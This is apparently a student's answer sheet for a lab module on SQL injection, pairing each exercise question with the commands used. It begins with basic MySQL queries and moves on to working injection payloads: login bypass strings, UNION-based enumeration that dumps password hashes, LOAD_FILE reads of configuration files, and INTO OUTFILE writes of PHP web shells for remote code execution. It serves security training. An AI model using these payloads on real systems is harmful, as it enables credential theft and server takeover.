## Intro to MySQL

>**Q. Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?**

```bash
mysql -u root -h 94.237.59.206 -P 35744 -p
```
```sql
SHOW DATABASES;
```

## SQL Statements

>**Q. What is the department number for the 'Development' department?**

```sql
SHOW DATABASES;

USE employees;

SHOW TABLES;

SELECT * FROM departments;
```

## Query Results

>**Q. What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?**

```sql
SELECT * FROM employees WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
```

## SQL Operators

>**Q. In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?**

```sql
SELECT * FROM titles;

SELECT * FROM titles WHERE emp_no > 10000 OR title !='engineer';
```

## Subverting Query Logic

>**Q. Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**

```sql
tom' OR '1'='1
```

## Using Comments

>**Q. Login as the user with the id 5 to get the flag.**

```sql
user' OR id=5)--    
```

## Union Clause

>**Q. Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.**

```bash
mysql -u root -h 94.237.54.69 -P 59629 -p
```

```sql
SHOW DATABASES;

USE employees;

SHOW TABLES;

SELECT * FROM employees;

SELECT * FROM departments; 

SELECT dept_no FROM departments UNION SELECT emp_no FROM employees;
```

## Union Injection

>**Q. Use a Union injection to get the result of 'user()'**

```sql
' order by 1-- -

es' UNION select 1,2,3,4-- -

' UNION select 1,@@version,3,4-- -

es' UNION select 1,user(),3,4-- -
```
## Database Enumeration

>**Q. What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**

```sql
cn' UNION select 1, username, password, 4 from users-- -
```

## Reading Files

>**Q. We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.**

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

## Writing Files

>**Q. Find the flag by using a webshell.**

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

cn' union select "",'<?php system(ls); ?>', "", "" into outfile '/var/www/html/shell1.php'-- -

cn' union select "",'<?php system("dir /var/www"); ?>', "", "" into outfile '/var/www/html/shell1.php'-- -

cn' union select "",'<?php system("cat /var/www/flag.txt"); ?>', "", "" into outfile '/var/www/html/shell10.php'-- -
```

## Skills Assessment - SQL Injection Fundamentals

>**Q. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.**

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master

```sql

' or 1=1 limit 1 -- -+

cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

cn' union select 1,2,'file written successfully!',3,4 into outfile '/var/www/html/dashboard/proof.txt'-- -

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

cn' union select "","",'<?php system(ls); ?>', "", "" into outfile '/var/www/html/dashboard/shell1.php'-- -

cn' union select "","",'<?php system("dir /"); ?>', "", "" into outfile '/var/www/html/dashboard/shell6.php'-- -

cn' union select "","",'<?php system("cat /flag_....txt"); ?>', "", "" into outfile '/var/www/html/dashboard/shell8.php'-- -
```
